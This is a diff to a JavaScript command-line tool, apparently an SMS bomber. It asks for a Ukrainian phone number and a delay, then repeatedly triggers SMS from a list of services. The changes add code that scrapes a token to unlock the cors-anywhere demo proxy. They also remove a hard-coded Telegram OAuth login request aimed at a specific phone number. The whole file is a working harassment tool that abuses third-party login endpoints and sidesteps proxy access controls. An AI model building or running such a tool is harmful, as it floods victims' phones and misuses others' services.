@@ -1,6 +1,7 @@
 // noinspection JSUnresolvedVariable
 // noinspection JSCheckFunctionSignatures
 
+import * as Cheerio from 'cheerio'
 import Axios from 'axios'
 import UserAgent from 'user-agents'
 import Chalk from 'chalk'
@@ -18,9 +19,10 @@ const headers = {
 (async () => {
     console.clear()
 
-    // Не змінювати назву змінної.
     const number = await ask(Chalk.magentaBright('Введіть номер телефону: ') + '+380')
     const delay_between = await ask(Chalk.magentaBright('Затримка між СМС (у секундах): '))
+
+    await requestTemporaryProxy()
 
     const services_str = await readFile('./services.json')
     const json = JSON.parse(services_str)
@@ -47,9 +49,6 @@ const headers = {
                     )
 
                     console.log(output)
-                    if (!success && response === 'idk') {
-                        console.log(response)
-                    }
                 } catch (error) {
                     if (Axios.isAxiosError(error)) {
                         const output = wrapText(('red'), (error.status + ', ' + target_name))
@@ -65,10 +64,6 @@ const headers = {
         }, i * (delay_between * 1_000))
     }
 })()
-
-async function sendRequest() {
-    return Axios.post("https://cors-anywhere.herokuapp.com/https://oauth.telegram.org/auth/request?bot_id=531675494&origin=https%3A%2F%2Ftelegram.org&embed=1&request_access=write&return_to=https%3A%2F%2Ftelegram.org%2Fblog%2Flogin%3Fsetln%3Dru", new URLSearchParams({ phone: '380634350140' }).toString(), { headers: { ...headers, "Content-type": "application/x-www-form-urlencoded", "x-requested-with": "https://localhost" }, withCredentials: true })
-}
 
 async function sendRepeatableRequest (runnable, cooldown) {
     await runnable()
@@ -111,6 +106,8 @@ function wrapText (quad_color, text) {
             return Chalk.bgGreenBright('  ') + ' ' + text
         case 'red':
             return Chalk.bgRedBright('  ') + ' ' + text
+        case 'gray':
+            return Chalk.bgGray('  ') + ' ' + text
 
         default: {
             return Chalk.bgWhite('  ') + ' ' + text
@@ -121,3 +118,16 @@ function wrapText (quad_color, text) {
 function convertFunctionToString (function_) {
     return '(' + function_.toString() + ')()'
 }
+
+async function requestTemporaryProxy () {
+    console.log(wrapText('gray', 'Отримуємо тимчасовий проксі сервер...'))
+
+    await fetch('https://cors-anywhere.herokuapp.com/corsdemo').then(async (r) => {
+        const html = await r.text()
+        const $ = Cheerio.load(html)
+
+        const accessRequest = $('input[name="accessRequest"]').attr('value')
+        await fetch(`https://cors-anywhere.herokuapp.com/corsdemo?accessRequest=${accessRequest}`)
+    })
+}
+
